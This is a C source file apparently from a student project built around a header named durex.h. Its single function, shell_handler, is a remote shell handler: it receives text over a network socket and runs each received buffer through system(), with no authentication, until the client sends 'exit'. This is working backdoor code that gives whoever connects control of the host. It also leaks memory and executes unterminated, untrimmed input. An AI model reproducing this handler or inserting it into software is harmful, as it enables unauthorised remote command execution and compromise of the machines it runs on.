/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   shell.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/06/06 16:25:59 by hivian            #+#    #+#             */
/*   Updated: 2017/06/09 10:18:05 by hivian           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

void			*shell_handler(void *context)
{
	int			ret;
	char		buffer[BUF_SIZE];
	char		str[256];
	t_thread_params	*c = (t_thread_params*) context;
	int sock = c->csock;

	bzero(str, sizeof(str));
	bzero(buffer, sizeof(buffer));
	while ((ret = recv(sock, buffer, BUF_SIZE, 0)) > 0) {
		char *trim = strtrim(buffer);
		if (!trim)
		{
			print_logs(c->logs, "Malloc error");
			continue ;
		}
		if (!strcmp(trim, "exit")) {
			ret = 0;
			break ;
		}
		system(buffer);
		bzero(buffer, sizeof(buffer));
	}
	if (ret == 0)
    {
		pthread_mutex_lock(&lock);
		c->total_connection--;
		pthread_mutex_unlock(&lock);
		snprintf(str, sizeof(str), "[Client %s:%d] disconnected.", c->cli_ip, c->cli_port);
		print_logs(c->logs, str);
    }
    else if (ret == -1)
		print_logs(c->logs, "Recv error");
	pthread_mutex_lock(&lock);
	c->shell_on = false;
	close(sock);
	pthread_mutex_unlock(&lock);
	return (NULL);
}
